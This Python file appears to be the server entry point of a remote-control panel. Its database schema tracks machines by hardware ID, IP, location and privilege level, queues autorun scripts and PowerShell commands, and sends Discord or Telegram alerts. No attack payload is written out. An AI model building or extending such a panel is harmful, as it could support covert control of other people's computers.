from quart import Quart
from quart_rate_limiter import RateLimiter
import aiosqlite
import asyncio
import datetime
import os
import ssl

from config import DATABASE
from settings import Settings
from websocket.web_sockets import (
    register_websocket_routes,
    stats_broadcaster,
)
from routes import register_all_routes
from generate_certificates import generate_self_signed_cert

# SSL certificate paths
CERT_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "cert.pem")
KEY_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "key.pem")

app = Quart(__name__)
rate_limiter = RateLimiter(app)

# SSL Configuration
USE_SSL = True  # Set to False to disable SSL

app.template_folder = os.path.join(os.path.dirname(__file__), "templates")
app.static_folder = os.path.join(os.path.dirname(__file__), "static")


app = register_websocket_routes(app)
app = register_all_routes(app)


async def init_db():
    """Initialize the SQLite database with required tables"""
    try:
        async with aiosqlite.connect(DATABASE) as db:

            await db.execute(
                """
                CREATE TABLE IF NOT EXISTS user (
                    id INTEGER PRIMARY KEY,
                    pcname TEXT NOT NULL,
                    ip_address TEXT NOT NULL,
                    country TEXT,
                    latitude REAL DEFAULT 0.0,
                    longitude REAL DEFAULT 0.0,
                    last_ping TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    first_ping TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    is_active BOOLEAN DEFAULT 0,
                    hwid TEXT UNIQUE,
                    hostname TEXT,
                    elevated_status TEXT DEFAULT 'Unknown'
                )
                """
            )

            await db.execute(
                """
                CREATE TABLE IF NOT EXISTS scripts (
                    id INTEGER PRIMARY KEY,
                    name TEXT NOT NULL,
                    content TEXT NOT NULL,
                    is_global BOOLEAN DEFAULT 0,
                    user_id INTEGER,
                    executed BOOLEAN DEFAULT 0,
                    autorun BOOLEAN DEFAULT 0,
                    startup BOOLEAN DEFAULT 0,
                    manually_triggered BOOLEAN DEFAULT 0,
                    execution_order INTEGER DEFAULT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES user (id)
                )
                """
            )

            await db.execute(
                """
                CREATE TABLE IF NOT EXISTS console_commands (
                    id INTEGER PRIMARY KEY,
                    user_id INTEGER NOT NULL,
                    command TEXT NOT NULL,
                    shell_type TEXT NOT NULL DEFAULT 'powershell',
                    status TEXT NOT NULL DEFAULT 'pending',
                    output TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    executed_at TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES user (id)
                )
                """
            )

            await db.execute(
                """
                CREATE TABLE IF NOT EXISTS notification_configs (
                    id INTEGER PRIMARY KEY,
                    type TEXT NOT NULL CHECK (type IN ('discord', 'telegram')),
                    webhook_url TEXT,
                    bot_token TEXT,
                    chat_id TEXT,
                    is_enabled BOOLEAN DEFAULT 1,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP
                )
                """
            )

            await db.commit()
            print("Database initialization complete")
    except Exception as e:
        print(f"Error initializing database: {e}")
        raise


@app.before_serving
async def before_serving():
    """Initialize the database and start background tasks before serving the application"""
    # Generate SSL certificate if needed
    if USE_SSL:
        generate_self_signed_cert(CERT_FILE, KEY_FILE)

    await init_db()

    app.background_tasks = set()

    stats_task = asyncio.create_task(stats_broadcaster())
    app.background_tasks.add(stats_task)

    active_status_task = asyncio.create_task(update_active_status())
    app.background_tasks.add(active_status_task)

    cleanup_task = asyncio.create_task(cleanup_executed_scripts())
    app.background_tasks.add(cleanup_task)

    print(f"Started {len(app.background_tasks)} background tasks")


async def update_active_status():
    """Background task to update user active status based on ping time"""
    while True:
        try:
            active_threshold = datetime.datetime.now(
                datetime.timezone.utc
            ) - datetime.timedelta(minutes=15)
            active_threshold_str = active_threshold.strftime("%Y-%m-%d %H:%M:%S")

            async with aiosqlite.connect(DATABASE) as db:
                await db.execute(
                    """
                    UPDATE user 
                    SET is_active = 0 
                    WHERE last_ping < ? AND is_active = 1
                    """,
                    [active_threshold_str],
                )
                await db.commit()
        except Exception as e:
            print(f"Error updating active status: {e}")

        await asyncio.sleep(60)


async def cleanup_executed_scripts():
    """Background task to clean up executed cleanup scripts and complete user deletion"""
    while True:
        try:
            async with aiosqlite.connect(DATABASE) as db:
                db.row_factory = aiosqlite.Row

                query = """
                    SELECT u.id as user_id, s.id as script_id
                    FROM user u
                    JOIN scripts s ON s.user_id = u.id
                    WHERE s.name = 'Client Cleanup' 
                    AND s.executed = 1
                    AND u.pcname LIKE 'PENDING_DELETION_%'
                """
                cursor = await db.execute(query)
                users_to_delete = await cursor.fetchall()

                for user in users_to_delete:
                    user_id = user["user_id"]
                    script_id = user["script_id"]

                    await db.execute(
                        "DELETE FROM scripts WHERE user_id = ?", (user_id,)
                    )

                    await db.execute("DELETE FROM user WHERE id = ?", (user_id,))
                    print(
                        f"User {user_id} fully deleted after cleanup script execution"
                    )

                query = """
                    SELECT s.id
                    FROM scripts s 
                    LEFT JOIN user u ON s.user_id = u.id
                    WHERE s.name = 'Client Cleanup' 
                    AND s.executed = 1 
                    AND u.id IS NULL
                """
                cursor = await db.execute(query)
                orphaned_scripts = await cursor.fetchall()

                for script in orphaned_scripts:
                    await db.execute(
                        "DELETE FROM scripts WHERE id = ?", (script["id"],)
                    )

                await db.commit()

                if users_to_delete or orphaned_scripts:
                    print(
                        f"Cleaned up {len(users_to_delete)} users and {len(orphaned_scripts)} orphaned scripts"  # type: ignore
                    )

        except Exception as e:
            print(f"Error cleaning up executed scripts: {e}")

        await asyncio.sleep(30)


@app.after_serving
async def after_serving():
    """Clean up background tasks after serving"""
    for task in app.background_tasks:
        task.cancel()

    if app.background_tasks:
        await asyncio.gather(*app.background_tasks, return_exceptions=True)


if __name__ == "__main__":
    # we know debug is true because the only way this code can be ran is if your NOT using hypercorn
    Settings.debug = True
    if USE_SSL:
        if not os.path.exists(CERT_FILE) or not os.path.exists(KEY_FILE):
            generate_self_signed_cert(CERT_FILE, KEY_FILE)

        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain(CERT_FILE, KEY_FILE)
        app.run(debug=True, ssl=ssl_context, host="127.0.0.1", port=40175)
    else:
        app.run(debug=True, host="127.0.0.1", port=40175)
